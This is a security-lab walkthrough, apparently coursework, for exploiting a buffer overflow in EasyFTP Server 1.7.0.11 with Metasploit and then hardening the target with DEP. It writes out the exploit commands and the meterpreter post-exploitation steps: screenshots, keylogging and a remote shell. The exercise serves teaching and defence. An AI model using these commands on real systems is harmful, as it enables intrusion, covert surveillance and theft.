# Taking Control of a Server with Metasploit

## Description
- Take control of a server on which EasyFtp Server 1.7.0.11 is installed and on service with [Metasploit](https://www.metasploit.com/)
  - There is a vulnerability of stack-based buffer overflow in [EasyFTP Server 1.7.0.11 and earlier](https://www.rapid7.com/db/modules/exploit/windows/ftp/easyftp_cwd_fixret/)
  - There is an [exploit](https://www.exploit-db.com/exploits/14402) integrated with [metasploit-framework](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/ftp/easyftp_cwd_fixret.rb)
- There are [many software](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=buffer+overflow) contain the vulnerability of buffer overflow, but not all of them can be used to take control of a server

## Equipments
- Both the Kali Linux VM 🐧 and the Windows server VM 🪟

## Tasks
On Windows server VM, 🪟

0. Stop the FileZilla server
1. Install, configure and run EasyFTP
   1. Download [EasyFTP Server 1.7.0.11](../repo/easyftp-server-1.7.0.11-en.7z)
   2. unzip it with [7-zip](https://www.7-zip.org/). If you did not install 7-zip, download and install it first
   3. In the unzipped folder, run ftpconsole
   4. Stop the FTP service
   5. Configure the FTP service binding IP address to the Windows VM IP
   6. Restart EasyFTP Server. If the service won't start, delete the possibly installed broken version
   ```cmd
   :: open a command windows, run it as Administrator
   sc delete easyftpbasicsvr
   ```

On Kali Linux VM, 🐧 in a command terminal

2. Exploit the Windows target

```bash
# 2.1 Find a metasploit exploit
# ~$ - inside terminal msf> - inside metasploit
~$ msfconsole -q
msf> search easyftp

# 2.2 Select options and target
msf> use exploit/windows/ftp/easyftp_cwd_fixret
msf exploit(easyftp_cwd_fixret) > show options # find the required options

msf exploit(easyftp_cwd_fixret) > show targets

# 2.3 Exploit the target
msf exploit(easyftp_cwd_fixret) > set RHOST Windows_VM_IP
msf exploit(easyftp_cwd_fixret) > set TARGET Number_of_target_Windows_Universal - v1.7.0.11
msf exploit(easyftp_cwd_fixret) > exploit # enter meterpreter if succeeded

# 2.4 Loot the target
# 2.4.1 find the usage of meterpreter
meterpreter > help
# 2.4.2 get the system information of the victim
meterpreter > sysinfo
# 2.4.3 get an image of the target's desktop
meterpreter > screenshot
# 2.4.4 key logging
# Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
meterpreter > keyscan_start
# Shows the keystrokes captured so far
meterpreter > keyscan_dump	

# 2.4.5 Get a Windows Command Prompt on the target
meterpreter > shell
# Leaves the Windows Command Prompt
C:\Users\Administrator :$ exit
meterpreter > 

# 2.4.6 exit meterpreter
meterpreter > exit
msf >

# 2.4.7 exit metasploit
msf > exit
~ $
```

On Windows server VM, 🪟

3. Hardening the target machine by turning on Data Execution Protection (DEP) 
4. Restart Windows server VM then restart EasyFTP

On Kali Linux VM, 🐧

5. Launch the easyftp_cwd_fixret exploit again

On Windows server VM, 🪟

6. If you see a box pops up saying "ftpbasicsvr.exe has stopped working", then DEP has saved your server by stopping the attack!


# Reference
- [Project 3C: Metasploit v. EasyFTP](https://samsclass.info/123/proj14/p3cmet.htm)
- *Metasploit*
  - [METERPRETER BASIC COMMANDS](https://www.offsec.com/metasploit-unleashed/meterpreter-basics/)
  - [Ultimate List of Meterpreter Commands](https://www.hackers-arise.com/ultimate-list-of-meterpreter-command)
  - [Metasploit unleashed](https://www.offsec.com/metasploit-unleashed/)